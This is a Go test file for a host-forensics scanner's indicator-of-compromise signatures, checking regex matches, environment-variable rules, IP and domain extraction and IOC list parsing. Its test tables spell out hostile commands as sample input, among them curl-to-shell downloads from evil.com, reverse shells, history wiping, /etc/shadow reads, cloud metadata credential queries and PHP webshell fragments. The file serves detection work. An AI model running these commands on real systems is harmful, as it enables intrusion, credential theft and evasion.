package ioc_test

import (
	"os"
	"path/filepath"
	"regexp"
	"testing"

	"github.com/pathfinder/internal/ioc"
)

var bashHistoryTests = []struct {
	id      string
	match   string
	noMatch string
}{
	{"BH001", "curl http://evil.com/x.sh | sh", "curl http://example.com -o file.txt"},
	{"BH002", "wget http://evil.com/x -O- | bash", "wget http://example.com -O output.txt"},
	{"BH003", "python3 -c 'import os; os.system(\"id\")'", "python3 script.py"},
	{"BH004", `perl -e 'system("id")'`, "perl -p -i 's/foo/bar/' file.txt"},
	{"BH005", "cat payload.b64 | base64 -d | sh", "echo hello | base64 -d"},
	{"BH006", "nc 10.0.0.1 4444 -e /bin/bash", "nc 10.0.0.1 80"},
	{"BH007", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "bash script.sh"},
	{"BH008", "socat exec:/bin/bash,pty tcp:10.0.0.1:4444", "socat - PIPE:/dev/null"},
	{"BH009", "history -c && HISTFILESIZE=0", "echo hello"},
	{"BH010", "dd if=/dev/mem of=/tmp/dump bs=1M", "dd if=input.img of=output.img"},
	{"BH011", "iptables -F && iptables -X", "iptables -L"},
	{"BH012", "useradd -m -s /bin/bash attacker", "cat /etc/passwd"},
	{"BH013", "usermod -u 1001 attacker -G sudo", "usermod -c 'new comment' user"},
	{"BH014", "chmod +s /tmp/evil", "chmod +x script.sh"},
	{"BH015", "chattr +i /etc/passwd", "chattr -i /etc/passwd"},
	{"BH016", "pkill -9 syslog", "kill -15 1234"},
	{"BH017", "mount --bind /tmp /proc", "mount /dev/sda1 /mnt"},
	{"BH018", "python3 -m http.server 8080", "python3 app.py"},
	{"BH019", "wget http://evil.com/x -O /tmp/x", "wget http://example.com -O ./x"},
	{"BH020", "chmod 777 /etc/shadow", "chmod 644 file.txt"},
	{"BH021", "crontab -u root -e", "cat /etc/cron.d/job"},
	{"BH022", "nohup /tmp/backdoor &", "nohup nice -n 19 job.sh &; wait"},
	{"BH023", "eval $(curl http://evil.com/cmd)", "echo eval"},
	{"BH024", "scp evil.tar user@host:/tmp/", "rsync -av src/ dst/"},
	{"BH025", "export HISTFILE=/dev/null", "echo $HISTFILE"},
	{"BH026", "insmod /tmp/rootkit.ko", "lsmod | grep ext4"},
	{"BH027", "strace -f -o /tmp/out -p 1234", "ltrace ./program"},
	{"BH028", "tcpdump -i eth0 -w /tmp/cap.pcap", "ifconfig eth0"},
	{"BH029", "echo 'bash -i >& /dev/tcp/x/4444' | at now", "at -l"},
	{"BH030", "cat /etc/shadow | grep root", "grep -r foo /var/log"},

	// Modern malware TTPs (BH031–BH039)
	{"BH031", "shopt -ou history", "shopt -s history"},
	{"BH032", "setenforce 0", "getenforce"},
	{"BH033", "systemctl stop firewalld", "systemctl start firewalld"},
	{"BH034", "finit_module(fd, params, 0)", "module_init()"},
	{"BH035", "masscan 10.0.0.0/8 -p80", "nmap 10.0.0.0/8"},
	{"BH036", "curl -H x-aws-ec2-metadata-token-ttl-seconds:21600 http://169.254.169.254", "curl http://example.com"},
	{"BH037", "curl http://metadata.google.internal/computeMetadata/v1/", "curl http://metadata.local/"},
	{"BH038", "curl http://169.254.169.254/latest/meta-data/", "curl http://169.254.170.2/"},
	{"BH039", "chmod 4755 /tmp/backdoor", "chmod 755 /usr/bin/tool"},
}

func TestBashHistorySignatures(t *testing.T) {
	sigByID := make(map[string]ioc.Signature)
	for _, s := range ioc.BashHistorySignatures {
		sigByID[s.ID] = s
	}

	for _, tc := range bashHistoryTests {
		tc := tc
		t.Run(tc.id+"_match", func(t *testing.T) {
			sig, ok := sigByID[tc.id]
			if !ok {
				t.Fatalf("%s: signature not found", tc.id)
			}
			if !sig.Pattern.MatchString(tc.match) {
				t.Errorf("%s: expected match for %q", tc.id, tc.match)
			}
		})
		t.Run(tc.id+"_no_match", func(t *testing.T) {
			sig := sigByID[tc.id]
			if sig.Pattern.MatchString(tc.noMatch) {
				t.Errorf("%s: unexpected match for %q", tc.id, tc.noMatch)
			}
		})
	}
}

var stringHuntTests = []struct {
	id      string
	match   string
	noMatch string
}{
	{"SH001", `system('/bin/sh -c id')`, "exec('ls')"},
	{"SH002", "passthru($cmd)", "echo hello"},
	{"SH003", "echo base64_decode($payload)", "echo hello"},
	{"SH004", "gzinflate(base64_decode($x))", "inflate data"},
	{"SH005", "REMOTE_ADDR=10.0.0.1 REQUEST_URI=/admin", "echo hello"},

	{"SH006", "AAAAB3NzaC1yc2EAAAADAQABAAAAssh-rsa", "echo hello"},
	{"SH007", "curl https://pastebin.com/raw/abc123", "curl https://example.com/file"},
	{"SH008", "wget http://evil.com/x", "python3 fetch.py"},
	{"SH009", `var tok = process.env.GITHUB_TOKEN`, `var env = process.env.NODE_ENV`},
	{"SH010", `dns.resolve('evil.com', cb)`, `dns.promises.resolve('example.com')`},

	{"SH011", `eval(atob('aHR0cHM6Ly9ldmlsLmNvbQ=='))`, `eval(myCleanFunc())`},
	{"SH012", `Function("return process.env.HOME")()`, `new Function(myVar)`},
	{"SH013", `setTimeout("eval(cmd)", 100)`, `setTimeout(cleanup, 1000)`},
	{"SH014", `require('child_process').exec('id')`, `require('path').join(a, b)`},
	{"SH015", `execSync('curl evil.com | bash')`, `execute('./setup.sh')`},
	{"SH016", `if (os.platform() === 'linux')`, `if (release() === '5.0')`},
	{"SH017", `fs.writeFileSync('/tmp/x', data)`, `filesystem.write('/tmp/data')`},
	{"SH018", `os.system('curl evil.com | bash')`, `os.path.join('/usr', 'bin')`},
	{"SH019", `subprocess.run(['id'], shell=True)`, `subprocessor.start()`},
	{"SH020", `python3 -c 'import os; os.system("id")'`, `python3 script.py`},
	{"SH021", `bash -c "$(curl -fsSL http://evil.com/setup)"`, `bash -c 'echo hello'`},
}

func TestStringHuntSignatures(t *testing.T) {
	sigByID := make(map[string]ioc.Signature)
	for _, s := range ioc.StringHuntSignatures {
		sigByID[s.ID] = s
	}

	for _, tc := range stringHuntTests {
		tc := tc
		t.Run(tc.id+"_match", func(t *testing.T) {
			sig, ok := sigByID[tc.id]
			if !ok {
				t.Fatalf("%s: signature not found", tc.id)
			}
			if !sig.Pattern.MatchString(tc.match) {
				t.Errorf("%s: expected match for %q", tc.id, tc.match)
			}
		})
		t.Run(tc.id+"_no_match", func(t *testing.T) {
			sig := sigByID[tc.id]
			if sig.Pattern.MatchString(tc.noMatch) {
				t.Errorf("%s: unexpected match for %q", tc.id, tc.noMatch)
			}
		})
	}
}

func findEnvRule(name string) *ioc.EnvVarRule {
	for i := range ioc.SuspiciousEnvRules {
		if ioc.SuspiciousEnvRules[i].Name == name {
			return &ioc.SuspiciousEnvRules[i]
		}
	}
	return nil
}

func TestEnvVarRules_HISTFILE(t *testing.T) {
	r := findEnvRule("HISTFILE")
	if r == nil {
		t.Fatal("HISTFILE rule not found")
	}
	if !r.CheckValue("/dev/null") {
		t.Error("expected /dev/null to trigger HISTFILE rule")
	}
	if r.CheckValue("/home/user/.bash_history") {
		t.Error("expected normal history path to not trigger HISTFILE rule")
	}
}

func TestEnvVarRules_HISTSIZE(t *testing.T) {
	r := findEnvRule("HISTSIZE")
	if r == nil {
		t.Fatal("HISTSIZE rule not found")
	}
	if !r.CheckValue("0") {
		t.Error("expected '0' to trigger HISTSIZE rule")
	}
	if r.CheckValue("1000") {
		t.Error("expected '1000' to not trigger HISTSIZE rule")
	}
}

func TestEnvVarRules_LDPRELOAD(t *testing.T) {
	r := findEnvRule("LD_PRELOAD")
	if r == nil {
		t.Fatal("LD_PRELOAD rule not found")
	}
	if !r.CheckValue("/tmp/hook.so") {
		t.Error("expected /tmp/hook.so to trigger LD_PRELOAD rule")
	}
	if !r.CheckValue("/dev/shm/lib.so") {
		t.Error("expected /dev/shm/lib.so to trigger LD_PRELOAD rule")
	}
	if r.CheckValue("/usr/lib/libssl.so") {
		t.Error("expected /usr/lib path to not trigger LD_PRELOAD rule")
	}
}

func TestEnvVarRules_PATH(t *testing.T) {
	r := findEnvRule("PATH")
	if r == nil {
		t.Fatal("PATH rule not found")
	}
	if !r.CheckValue(".:/usr/bin:/bin") {
		t.Error("expected leading dot to trigger PATH rule")
	}
	if !r.CheckValue("/tmp/tools:/usr/bin") {
		t.Error("expected /tmp prefix to trigger PATH rule")
	}
	if r.CheckValue("/usr/local/bin:/usr/bin:/bin") {
		t.Error("expected normal PATH to not trigger rule")
	}
}

func TestEnvVarRules_HISTCONTROL(t *testing.T) {
	r := findEnvRule("HISTCONTROL")
	if r == nil {
		t.Fatal("HISTCONTROL rule not found")
	}
	if !r.CheckValue("ignorespace:erasedups") {
		t.Error("expected ignorespace to trigger rule")
	}
	if r.CheckValue("erasedups") {
		t.Error("expected erasedups-only to not trigger rule")
	}
}

func TestEnvVarRules_LDPRELOAD_NonStandardMedium(t *testing.T) {
	var medRule *ioc.EnvVarRule
	for i := range ioc.SuspiciousEnvRules {
		r := &ioc.SuspiciousEnvRules[i]
		if r.Name == "LD_PRELOAD" && r.Severity == "MEDIUM" {
			medRule = r
			break
		}
	}
	if medRule == nil {
		t.Fatal("MEDIUM LD_PRELOAD rule not found")
	}
	if !medRule.CheckValue("/lib/preload_backdoor.so") {
		t.Error("/lib/preload_backdoor.so: want MEDIUM rule to fire")
	}
	if medRule.CheckValue("/tmp/evil.so") {
		t.Error("/tmp/evil.so: HIGH rule owns this, MEDIUM must not double-fire")
	}
	if medRule.CheckValue("/usr/lib/libssl.so") {
		t.Error("/usr/lib/libssl.so: must not trigger MEDIUM rule")
	}
}

func TestEnvVarRule_SuppressionComms_Field(t *testing.T) {
	var ldPreloadRules []*ioc.EnvVarRule
	for i := range ioc.SuspiciousEnvRules {
		r := &ioc.SuspiciousEnvRules[i]
		if r.Name == "LD_PRELOAD" {
			ldPreloadRules = append(ldPreloadRules, r)
		}
	}
	if len(ldPreloadRules) == 0 {
		t.Fatal("no LD_PRELOAD rules found")
	}
	for _, r := range ldPreloadRules {
		if len(r.SuppressionComms) == 0 {
			t.Errorf("LD_PRELOAD %s rule: want SuppressionComms declared", r.Severity)
		}
		found := false
		for _, c := range r.SuppressionComms {
			if c == "faketime" {
				found = true
			}
		}
		if !found {
			t.Errorf("LD_PRELOAD %s rule: want 'faketime' in SuppressionComms", r.Severity)
		}
	}
}

func TestIsPrivateIP(t *testing.T) {
	tests := []struct {
		ip      string
		private bool
	}{
		{"10.0.0.1", true},
		{"172.16.5.1", true},
		{"192.168.1.1", true},
		{"127.0.0.1", true},
		{"169.254.1.1", true},
		{"8.8.8.8", false},
		{"1.1.1.1", false},
		{"45.33.32.156", false},
		{"not-an-ip", true}, // unparseable treated as private (safe default)
	}
	for _, tc := range tests {
		got := ioc.IsPrivateIP(tc.ip)
		if got != tc.private {
			t.Errorf("IsPrivateIP(%q) = %v, want %v", tc.ip, got, tc.private)
		}
	}
}

func TestIsPrivateIP_IPv6ULA(t *testing.T) {
	if !ioc.IsPrivateIP("fc00::1") {
		t.Error("fc00::1 (ULA) should be private")
	}
	if !ioc.IsPrivateIP("fd12:3456::1") {
		t.Error("fd.. (ULA) should be private")
	}
	if ioc.IsPrivateIP("2606:4700:4700::1111") {
		t.Error("public IPv6 should not be private")
	}
}

func TestExtractExternalIPs_SkipsUnparseable(t *testing.T) {
	got := ioc.ExtractExternalIPs("ok 8.8.8.8 and 10.0.0.1 internal 1.2.3.4")
	want := map[string]bool{"8.8.8.8": true, "1.2.3.4": true}
	if len(got) != len(want) {
		t.Fatalf("got %v, want keys %v", got, want)
	}
	for _, ip := range got {
		if !want[ip] {
			t.Errorf("unexpected ip %q", ip)
		}
	}
}

func TestExtractExternalIPs(t *testing.T) {
	text := "Connected from 192.168.1.5 to 8.8.8.8, also saw 10.0.0.1 and 45.33.32.156"
	ips := ioc.ExtractExternalIPs(text)
	if len(ips) != 2 {
		t.Fatalf("expected 2 external IPs, got %d: %v", len(ips), ips)
	}
	found := make(map[string]bool)
	for _, ip := range ips {
		found[ip] = true
	}
	if !found["8.8.8.8"] {
		t.Error("expected 8.8.8.8 in results")
	}
	if !found["45.33.32.156"] {
		t.Error("expected 45.33.32.156 in results")
	}
}

func TestIsInSafeDir(t *testing.T) {
	tests := []struct {
		path string
		safe bool
	}{
		{"/usr/bin/ls", true},
		{"/bin/bash", true},
		{"/sbin/init", true},
		{"/lib/libc.so", true},
		{"/opt/app/bin", true},
		{"/tmp/evil", false},
		{"/dev/shm/payload", false},
		{"/home/user/.config/evil", false},
	}
	for _, tc := range tests {
		got := ioc.IsInSafeDir(tc.path)
		if got != tc.safe {
			t.Errorf("IsInSafeDir(%q) = %v, want %v", tc.path, got, tc.safe)
		}
	}
}

func TestIsCompressedFile(t *testing.T) {
	tests := []struct {
		name       string
		compressed bool
	}{
		{"archive.tar.gz", true},
		{"data.zip", true},
		{"payload.7z", true},
		{"backup.tar.bz2", true},
		{"file.lz4", true},
		{"script.sh", false},
		{"binary", false},
		{"image.png", false},
	}
	for _, tc := range tests {
		got := ioc.IsCompressedFile(tc.name)
		if got != tc.compressed {
			t.Errorf("IsCompressedFile(%q) = %v, want %v", tc.name, got, tc.compressed)
		}
	}
}

func TestIsMagicELF(t *testing.T) {
	dir := t.TempDir()

	elfPath := filepath.Join(dir, "elf_binary")
	if err := os.WriteFile(elfPath, []byte("\x7fELF\x02\x01\x01\x00rest"), 0600); err != nil {
		t.Fatal(err)
	}
	if !ioc.IsMagicELF(elfPath) {
		t.Error("expected ELF file to be detected")
	}

	shPath := filepath.Join(dir, "script.sh")
	if err := os.WriteFile(shPath, []byte("#!/bin/bash\necho hello\n"), 0600); err != nil {
		t.Fatal(err)
	}
	if ioc.IsMagicELF(shPath) {
		t.Error("expected shell script to not be detected as ELF")
	}
}

func TestScanLines(t *testing.T) {
	text := "normal line\ncurl http://evil.com/x.sh | sh\nanother normal line"
	hits := ioc.ScanLines(text, ioc.BashHistorySignatures)
	if len(hits) == 0 {
		t.Fatal("expected at least one hit")
	}
	if hits[0].Sig.ID != "BH001" {
		t.Errorf("expected BH001, got %s", hits[0].Sig.ID)
	}
	if hits[0].LineNum != 2 {
		t.Errorf("expected line 2, got %d", hits[0].LineNum)
	}
}

func TestScanLines_NoFalsePositives(t *testing.T) {
	text := "ls -la\npwd\ncd /home/user\ncat README.md"
	hits := ioc.ScanLines(text, ioc.BashHistorySignatures)
	if len(hits) != 0 {
		t.Errorf("expected no hits for benign commands, got %d: %v", len(hits), hits)
	}
}

func TestScanLines_ReportsAllMatchesPerLine(t *testing.T) {
	line := "cat payload.b64 | base64 -d | curl http://evil.com | bash"
	hits := ioc.ScanLines(line, ioc.BashHistorySignatures)
	if len(hits) < 2 {
		t.Errorf("want at least 2 hits for multi-technique line, got %d", len(hits))
	}
	ids := make(map[string]bool)
	for _, h := range hits {
		ids[h.Sig.ID] = true
	}
	if !ids["BH001"] {
		t.Error("expected BH001 (curl pipe to shell)")
	}
	if !ids["BH005"] {
		t.Error("expected BH005 (base64 decode pipe)")
	}
}

func TestExtractDomains(t *testing.T) {
	text := "connecting to evil.com and api.attacker.io from localhost"
	domains := ioc.ExtractDomains(text)
	found := make(map[string]bool)
	for _, d := range domains {
		found[d] = true
	}
	if !found["evil.com"] {
		t.Error("expected evil.com")
	}
	if !found["api.attacker.io"] {
		t.Error("expected api.attacker.io")
	}
	if found["localhost"] {
		t.Error("localhost should be excluded")
	}
}

func TestIsInMalwareDir(t *testing.T) {
	if !ioc.IsInMalwareDir("/tmp/evil") {
		t.Error("expected /tmp/ to be malware dir")
	}
	if !ioc.IsInMalwareDir("/dev/shm/payload") {
		t.Error("expected /dev/shm/ to be malware dir")
	}
	if ioc.IsInMalwareDir("/usr/bin/ls") {
		t.Error("expected /usr/bin to not be malware dir")
	}
}

func TestBuildCategoryPreFilters_Count(t *testing.T) {
	filters := ioc.BuildCategoryPreFilters()
	if len(filters) != 4 {
		t.Fatalf("want 4 filters (webshells + stagers_c2 + script_exec + data_exfil), got %d", len(filters))
	}
}

func TestBuildCategoryPreFilters_WebshellMatches(t *testing.T) {
	filters := ioc.BuildCategoryPreFilters()
	fm := make(map[string]*regexp.Regexp)
	for _, f := range filters {
		fm[f.Category] = f.Re
	}
	ws, ok := fm["webshells"]
	if !ok {
		t.Fatal("webshells filter not found")
	}
	for _, line := range []string{
		`base64_decode($cmd)`,
		`passthru($_GET["cmd"])`,
		`shell_exec("id")`,
		`gzinflate(str_rot13($data))`,
		`echo $REMOTE_ADDR`,
	} {
		if !ws.MatchString(line) {
			t.Errorf("webshells filter: want match for %q", line)
		}
	}
	for _, line := range []string{"# normal config", "VAR=hello", "echo done"} {
		if ws.MatchString(line) {
			t.Errorf("webshells filter: false positive on %q", line)
		}
	}
}

func TestBuildCategoryPreFilters_StagersC2Matches(t *testing.T) {
	filters := ioc.BuildCategoryPreFilters()
	fm := make(map[string]*regexp.Regexp)
	for _, f := range filters {
		fm[f.Category] = f.Re
	}
	sc2, ok := fm["stagers_c2"]
	if !ok {
		t.Fatal("stagers_c2 filter not found")
	}
	for _, line := range []string{
		`wget --quiet http://pastebin.com/raw/abc`,
		`curl -q http://transfer.sh/file`,
		`AAAAB3NzaC1yc2EAAA`,
		`process.env.GITHUB_TOKEN`,
		`dns.resolve('evil.com', cb)`,
	} {
		if !sc2.MatchString(line) {
			t.Errorf("stagers_c2 filter: want match for %q", line)
		}
	}
	for _, line := range []string{"echo hello", "PATH=/usr/bin"} {
		if sc2.MatchString(line) {
			t.Errorf("stagers_c2 filter: false positive on %q", line)
		}
	}
}

func TestBuildCategoryPreFilters_ScriptExecMatches(t *testing.T) {
	filters := ioc.BuildCategoryPreFilters()
	fm := make(map[string]*regexp.Regexp)
	for _, f := range filters {
		fm[f.Category] = f.Re
	}
	se, ok := fm["script_exec"]
	if !ok {
		t.Fatal("script_exec filter not found")
	}
	for _, line := range []string{
		`eval(atob('aHR0cA=='))`,
		`require('child_process').exec('id')`,
		`subprocess.run(['id'], shell=True)`,
		`os.platform()`,
		`fs.readFileSync('/tmp/x', 'utf8')`,
		`bash -c "$(curl -fsSL http://evil.com)"`,
	} {
		if !se.MatchString(line) {
			t.Errorf("script_exec filter: want match for %q", line)
		}
	}
	for _, line := range []string{"echo hello", "PATH=/usr/bin", "const x = 1"} {
		if se.MatchString(line) {
			t.Errorf("script_exec filter: false positive on %q", line)
		}
	}
}

func TestMatchIP_LiteralNoSubstringMatch(t *testing.T) {
	sh := &ioc.IOCSet{}
	if err := ioc.AppendIPMatcher(sh, "1.1.1.1"); err != nil {
		t.Fatal(err)
	}
	// Must NOT match superset addresses
	if _, ok := sh.MatchIP("21.1.1.10"); ok {
		t.Error("1.1.1.1 literal should not match 21.1.1.10")
	}
	if _, ok := sh.MatchIP("211.1.1.100"); ok {
		t.Error("1.1.1.1 literal should not match 211.1.1.100")
	}
	// Must still match exact
	if _, ok := sh.MatchIP("1.1.1.1"); !ok {
		t.Error("1.1.1.1 literal should match 1.1.1.1")
	}
}

func TestIOCScanTextForIPs_MultiLineDedup(t *testing.T) {
	sh := &ioc.IOCSet{Hashes: make(map[string]struct{})}
	if err := ioc.AppendIPMatcher(sh, "1.2.3.4"); err != nil {
		t.Fatal(err)
	}
	// Same IP on three different lines; all three should produce a hit.
	text := "line1 1.2.3.4\nline2 1.2.3.4\nline3 1.2.3.4"
	hits := ioc.IOCScanTextForIPs(text, sh)
	if len(hits) != 3 {
		t.Errorf("want 3 hits (one per line), got %d", len(hits))
	}
}

func TestIOCScanTextForIPs_SameLineDedup(t *testing.T) {
	sh := &ioc.IOCSet{Hashes: make(map[string]struct{})}
	if err := ioc.AppendIPMatcher(sh, "1.2.3.4"); err != nil {
		t.Fatal(err)
	}
	// Same IP twice on one line; should produce exactly one hit.
	text := "1.2.3.4 connected to 1.2.3.4"
	hits := ioc.IOCScanTextForIPs(text, sh)
	if len(hits) != 1 {
		t.Errorf("want 1 hit for same IP on one line, got %d", len(hits))
	}
}

func TestCompileMatcher_GlobPipeIsLiteral(t *testing.T) {
	// | in a non-regex pattern should match literal pipe, not act as alternation
	iocSet, err := ioc.ParseIOCSetFromString("[commands]\ncurl | sh\n")
	if err != nil {
		t.Fatal(err)
	}
	hits := ioc.IOCScanText("curl | sh is suspicious", iocSet.Commands)
	if len(hits) == 0 {
		t.Error("expected match for literal pipe pattern")
	}
	// Must NOT match "curl" alone (which regex alternation would allow)
	hits2 := ioc.IOCScanText("curl http://example.com", iocSet.Commands)
	if len(hits2) > 0 {
		t.Error("pipe was compiled as alternation -- should not match 'curl' alone")
	}
}

func TestCompileMatcher_GlobDotIsLiteral(t *testing.T) {
	iocSet, err := ioc.ParseIOCSetFromString("[domains]\nevil.com\n")
	if err != nil {
		t.Fatal(err)
	}
	// evil.com as a literal (no special chars) should NOT match "evilXcom"
	hits := ioc.IOCScanText("contacted evilXcom server", iocSet.Domains)
	if len(hits) > 0 {
		t.Error("dot in glob was not escaped -- matched non-dot character")
	}
}

func TestParseIOCSetFromString_UnknownSectionNotCounted(t *testing.T) {
	iocSet, err := ioc.ParseIOCSetFromString("[badtypo]\n1.2.3.4\n")
	if err != nil {
		t.Fatal(err)
	}
	if iocSet.Loaded != 0 {
		t.Errorf("want Loaded=0 for unknown section, got %d", iocSet.Loaded)
	}
	if iocSet.Skipped != 1 {
		t.Errorf("want Skipped=1 for unknown section, got %d", iocSet.Skipped)
	}
}

func TestSH021_CoversBothBashAndSh(t *testing.T) {
	var sig ioc.Signature
	for _, s := range ioc.StringHuntSignatures {
		if s.ID == "SH021" {
			sig = s
			break
		}
	}
	if sig.ID == "" {
		t.Fatal("SH021 not found")
	}
	cases := []struct {
		input string
		match bool
	}{
		{`bash -c "$(curl -fsSL http://evil.com)"`, true},
		{`sh -c "$(curl -fsSL http://evil.com)"`, true},
		{`bash -c 'echo hello'`, false},
		{`sh -c 'echo hello'`, false},
	}
	for _, tc := range cases {
		got := sig.Pattern.MatchString(tc.input)
		if got != tc.match {
			t.Errorf("SH021 MatchString(%q) = %v, want %v", tc.input, got, tc.match)
		}
	}
}

func TestParseIOCSet_LoadsAllSections(t *testing.T) {
	content := `
[commands]
curl * | bash
regex:wget\s+-O-\s*\|

[ips]
185.220.101.5
10.0.0.0/8

[domains]
evil.com

[processes]
mimikatz

[filenames]
rootkit.ko

[hashes]
b94d27b9934d3e08a52e52d7da7dabfac484efe04294e576a6e1c4f0f53c9f55
`
	dir := t.TempDir()
	path := filepath.Join(dir, "ioc.txt")
	if err := os.WriteFile(path, []byte(content), 0600); err != nil {
		t.Fatal(err)
	}
	sh, err := ioc.ParseIOCSet(path)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(sh.Commands) != 2 {
		t.Errorf("want 2 commands, got %d", len(sh.Commands))
	}
	if len(sh.IPs) != 2 {
		t.Errorf("want 2 IPs (1 literal + 1 CIDR), got %d", len(sh.IPs))
	}
	if len(sh.Domains) != 1 {
		t.Errorf("want 1 domain, got %d", len(sh.Domains))
	}
	if len(sh.Processes) != 1 {
		t.Errorf("want 1 process, got %d", len(sh.Processes))
	}
	if len(sh.Filenames) != 1 {
		t.Errorf("want 1 filename, got %d", len(sh.Filenames))
	}
	if len(sh.Hashes) != 1 {
		t.Errorf("want 1 hash, got %d", len(sh.Hashes))
	}
	if sh.Loaded != 8 {
		t.Errorf("want Loaded=8, got %d", sh.Loaded)
	}
}

func TestParseIOCSet_InvalidHashSkipped(t *testing.T) {
	content := "[hashes]\nnothex!!\n"
	dir := t.TempDir()
	path := filepath.Join(dir, "ioc.txt")
	if err := os.WriteFile(path, []byte(content), 0600); err != nil {
		t.Fatal(err)
	}
	sh, err := ioc.ParseIOCSet(path)
	if err != nil {
		t.Fatal(err)
	}
	if sh.Loaded != 0 {
		t.Errorf("want Loaded=0 for invalid hash, got %d", sh.Loaded)
	}
	if sh.Skipped != 1 {
		t.Errorf("want Skipped=1, got %d", sh.Skipped)
	}
}

func TestParseIOCSet_CommentsAndBlankLinesIgnored(t *testing.T) {
	content := "# this is a comment\n\n[commands]\n# another comment\ncurl * | bash\n\n"
	dir := t.TempDir()
	path := filepath.Join(dir, "ioc.txt")
	if err := os.WriteFile(path, []byte(content), 0600); err != nil {
		t.Fatal(err)
	}
	sh, err := ioc.ParseIOCSet(path)
	if err != nil {
		t.Fatal(err)
	}
	if sh.Loaded != 1 {
		t.Errorf("want Loaded=1, got %d", sh.Loaded)
	}
}

func TestMatchIP_CIDRContainment(t *testing.T) {
	sh := &ioc.IOCSet{Hashes: make(map[string]struct{})}
	if err := ioc.AppendIPMatcher(sh, "10.0.0.0/8"); err != nil {
		t.Fatal(err)
	}
	cases := []struct {
		ip    string
		match bool
	}{
		{"10.0.0.1", true},
		{"10.255.255.254", true},
		{"11.0.0.1", false},
		{"192.168.1.1", false},
	}
	for _, tc := range cases {
		_, ok := sh.MatchIP(tc.ip)
		if ok != tc.match {
			t.Errorf("MatchIP(%q) = %v, want %v", tc.ip, ok, tc.match)
		}
	}
}

func TestIOCScanText_Basic(t *testing.T) {
	iocSet, err := ioc.ParseIOCSetFromString("[domains]\nevil.com\n")
	if err != nil {
		t.Fatal(err)
	}
	hits := ioc.IOCScanText("contacted evil.com last night", iocSet.Domains)
	if len(hits) != 1 {
		t.Fatalf("want 1 hit, got %d", len(hits))
	}
	if hits[0].LineNum != 1 {
		t.Errorf("want LineNum=1, got %d", hits[0].LineNum)
	}
}

func TestIOCScanText_EmptyReturnsNil(t *testing.T) {
	iocSet, err := ioc.ParseIOCSetFromString("[commands]\ncurl * | bash\n")
	if err != nil {
		t.Fatal(err)
	}
	hits := ioc.IOCScanText("", iocSet.Commands)
	if hits != nil {
		t.Error("want nil for empty text")
	}
}

func TestIOCScanTextForIPs_MatchesPrivateIPInSet(t *testing.T) {
	sh := &ioc.IOCSet{Hashes: make(map[string]struct{})}
	if err := ioc.AppendIPMatcher(sh, "192.168.1.100"); err != nil {
		t.Fatal(err)
	}
	hits := ioc.IOCScanTextForIPs("connecting from 192.168.1.100", sh)
	if len(hits) != 1 {
		t.Errorf("want 1 hit for matching private IP IOC, got %d", len(hits))
	}
}
